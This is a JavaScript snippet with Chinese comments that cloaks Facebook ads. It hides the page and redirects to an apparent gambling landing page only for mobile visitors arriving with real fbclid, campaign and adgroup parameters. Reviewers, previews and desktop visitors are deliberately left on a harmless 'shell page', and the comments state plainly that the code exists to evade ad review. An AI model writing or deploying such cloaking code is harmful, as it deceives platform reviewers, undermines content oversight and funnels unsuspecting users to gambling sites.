(function() {
    // 【1. 配置：你的落地页主地址】
    var landing_page = "https://www.goldenslot11.com/13/?p0=1uk61sz6";

    // 【2. 解析函数：获取参数并自动清理空格 (%20)】
    function getQueryParam(name) {
        var reg = new RegExp('(^|&)' + name + '=([^&]*)(&|$)', 'i');
        var r = window.location.search.substr(1).match(reg);
        if (r != null) {
            // decodeURIComponent 处理编码，trim() 处理空格
            return decodeURIComponent(r[2]).trim();
        }
        return "";
    }

    // 【3. 核心判定逻辑】
    function shouldRedirect() {
        var search = window.location.search.toLowerCase();
        var ua = navigator.userAgent.toLowerCase();

        // A. 占位符拦截（死刑）：只要含有 "{{", 说明是 FB 内部环境或预览，绝对不跳
        if (search.indexOf('{{') > -1 || search.indexOf('%7b%7b') > -1) {
            return false;
        }

        // B. 移动端强制校验：必须是手机，拦截 PC 端审核
        var isMobile = /android|iphone|ipad|ipod/.test(ua);
        if (!isMobile) return false;

        // C. 真实参数校验：这些参数经过 trim() 后，必须有实际内容
        // 只有 FB 真实匹配了参数，这些值才会有意义
        var fbclid = getQueryParam('fbclid');
        var campaign = getQueryParam('campaign');
        var adgroup = getQueryParam('adgroup');

        // 必须具备 fbclid，且 campaign 不能是空的（处理了 %20）
        if (fbclid === "" || campaign === "" || adgroup === "") {
            return false;
        }

        return true;
    }

    // 【4. 执行动作】
    if (shouldRedirect()) {
        // 判定为真实点击，隐藏 body 准备跳转（防止闪烁）
        document.documentElement.style.display = 'none';

        var connector = landing_page.indexOf('?') > -1 ? '&' : '?';
        var finalUrl = landing_page + connector + window.location.search.substring(1);
        
        window.location.replace(finalUrl);
    } else {
        // 判定为审核或无效点击，留在原地，显示控制台信息供你自己调试
        console.log("Verified: Stay in shell page.");
    }
})();
